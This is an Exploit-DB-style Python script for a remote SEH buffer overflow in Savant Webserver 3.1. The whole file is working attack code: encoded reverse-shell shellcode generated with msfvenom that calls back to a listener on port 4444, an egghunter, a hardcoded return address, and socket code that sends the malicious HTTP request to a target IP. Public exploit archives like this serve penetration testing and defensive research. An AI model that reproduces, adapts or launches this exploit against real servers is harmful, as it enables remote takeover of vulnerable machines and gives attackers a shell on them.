# Exploit Title: Savant Webserver v3.1  - Remote Buffer Overflow SEH
# Date: 1-5-2019
# Exploit Author: buffered4ever
# Vendor Homepage: http://savant.sourceforge.net
# Software Link: https://www.exploit-db.com/apps/08e770b173aa41be27db2304ac0df846-Savant31.exe
# Version: 3.1
# Tested on: Windows XP SP2

import os
import socket

target_address="192.168.0.102"
target_port=80

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e x86/alpha_mixed BufferRegister=EDI -f python
buf =  ""
buf += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x4b\x4c\x39\x78\x6b\x32\x75\x50\x73\x30\x53\x30\x33"
buf += "\x50\x6c\x49\x49\x75\x54\x71\x4b\x70\x43\x54\x6c\x4b"
buf += "\x36\x30\x76\x50\x6e\x6b\x50\x52\x74\x4c\x6c\x4b\x73"
buf += "\x62\x62\x34\x4e\x6b\x62\x52\x65\x78\x74\x4f\x48\x37"
buf += "\x51\x5a\x35\x76\x70\x31\x59\x6f\x4e\x4c\x67\x4c\x53"
buf += "\x51\x53\x4c\x63\x32\x34\x6c\x67\x50\x6a\x61\x4a\x6f"
buf += "\x64\x4d\x46\x61\x7a\x67\x5a\x42\x4c\x32\x66\x32\x66"
buf += "\x37\x4c\x4b\x50\x52\x42\x30\x6e\x6b\x53\x7a\x37\x4c"
buf += "\x6c\x4b\x50\x4c\x64\x51\x32\x58\x49\x73\x43\x78\x56"
buf += "\x61\x68\x51\x46\x31\x6e\x6b\x46\x39\x61\x30\x47\x71"
buf += "\x69\x43\x4c\x4b\x42\x69\x62\x38\x38\x63\x54\x7a\x62"
buf += "\x69\x4c\x4b\x30\x34\x4e\x6b\x63\x31\x78\x56\x35\x61"
buf += "\x79\x6f\x6c\x6c\x4f\x31\x4a\x6f\x34\x4d\x47\x71\x4a"
buf += "\x67\x47\x48\x4d\x30\x73\x45\x58\x76\x56\x63\x63\x4d"
buf += "\x48\x78\x55\x6b\x53\x4d\x31\x34\x71\x65\x49\x74\x53"
buf += "\x68\x4c\x4b\x70\x58\x56\x44\x77\x71\x39\x43\x52\x46"
buf += "\x6c\x4b\x44\x4c\x72\x6b\x4c\x4b\x76\x38\x45\x4c\x63"
buf += "\x31\x79\x43\x6e\x6b\x37\x74\x4c\x4b\x76\x61\x7a\x70"
buf += "\x4e\x69\x67\x34\x74\x64\x56\x44\x51\x4b\x63\x6b\x65"
buf += "\x31\x61\x49\x43\x6a\x52\x71\x4b\x4f\x4d\x30\x53\x6f"
buf += "\x31\x4f\x51\x4a\x6e\x6b\x56\x72\x6a\x4b\x6e\x6d\x31"
buf += "\x4d\x72\x48\x77\x43\x67\x42\x55\x50\x45\x50\x35\x38"
buf += "\x70\x77\x31\x63\x45\x62\x31\x4f\x30\x54\x45\x38\x52"
buf += "\x6c\x61\x67\x37\x56\x34\x47\x4b\x4f\x4e\x35\x68\x38"
buf += "\x4c\x50\x73\x31\x45\x50\x75\x50\x55\x79\x78\x44\x33"
buf += "\x64\x66\x30\x45\x38\x37\x59\x6f\x70\x62\x4b\x55\x50"
buf += "\x49\x6f\x4a\x75\x66\x30\x46\x30\x56\x30\x70\x50\x71"
buf += "\x50\x70\x50\x33\x70\x30\x50\x71\x78\x7a\x4a\x66\x6f"
buf += "\x79\x4f\x6b\x50\x49\x6f\x7a\x75\x4a\x37\x30\x6a\x67"
buf += "\x75\x45\x38\x39\x50\x6e\x48\x77\x70\x63\x58\x53\x58"
buf += "\x63\x32\x57\x70\x37\x61\x71\x4c\x4b\x39\x39\x76\x71"
buf += "\x7a\x34\x50\x51\x46\x43\x67\x65\x38\x6d\x49\x4e\x45"
buf += "\x50\x74\x31\x71\x79\x6f\x4b\x65\x4b\x35\x39\x50\x34"
buf += "\x34\x54\x4c\x4b\x4f\x32\x6e\x47\x78\x51\x65\x6a\x4c"
buf += "\x43\x58\x4a\x50\x58\x35\x39\x32\x43\x66\x4b\x4f\x6a"
buf += "\x75\x61\x78\x65\x33\x72\x4d\x53\x54\x35\x50\x6f\x79"
buf += "\x58\x63\x30\x57\x73\x67\x53\x67\x50\x31\x6b\x46\x52"
buf += "\x4a\x35\x42\x63\x69\x46\x36\x6b\x52\x69\x6d\x70\x66"
buf += "\x6f\x37\x43\x74\x46\x44\x37\x4c\x66\x61\x55\x51\x4c"
buf += "\x4d\x42\x64\x65\x74\x64\x50\x38\x46\x73\x30\x62\x64"
buf += "\x51\x44\x46\x30\x63\x66\x66\x36\x33\x66\x61\x56\x36"
buf += "\x36\x42\x6e\x43\x66\x71\x46\x30\x53\x72\x76\x45\x38"
buf += "\x54\x39\x68\x4c\x67\x4f\x4e\x66\x49\x6f\x4b\x65\x4e"
buf += "\x69\x6b\x50\x72\x6e\x33\x66\x42\x66\x6b\x4f\x56\x50"
buf += "\x42\x48\x46\x68\x4b\x37\x35\x4d\x53\x50\x49\x6f\x6a"
buf += "\x75\x4f\x4b\x58\x70\x6d\x65\x4c\x62\x30\x56\x70\x68"
buf += "\x69\x36\x6a\x35\x6f\x4d\x6d\x4d\x39\x6f\x39\x45\x37"
buf += "\x4c\x63\x36\x31\x6c\x74\x4a\x4d\x50\x69\x6b\x4b\x50"
buf += "\x71\x65\x75\x55\x4d\x6b\x33\x77\x55\x43\x34\x32\x72"
buf += "\x4f\x52\x4a\x73\x30\x36\x33\x39\x6f\x6b\x65\x41\x41"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer2="T00WT00W"+ buf


#00401D09  POP EBP,RETN
evilcrash = egghunter + "A" * (253-len(egghunter)) + "\x09\x1d\x40\x00" + "C" * 3

sendbuf =   "\x7d\x17" + "ST " + "/" + evilcrash +"\r\n\r\n" + buffer2


print "[*] Sending evil HTTP request to Savant"
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()

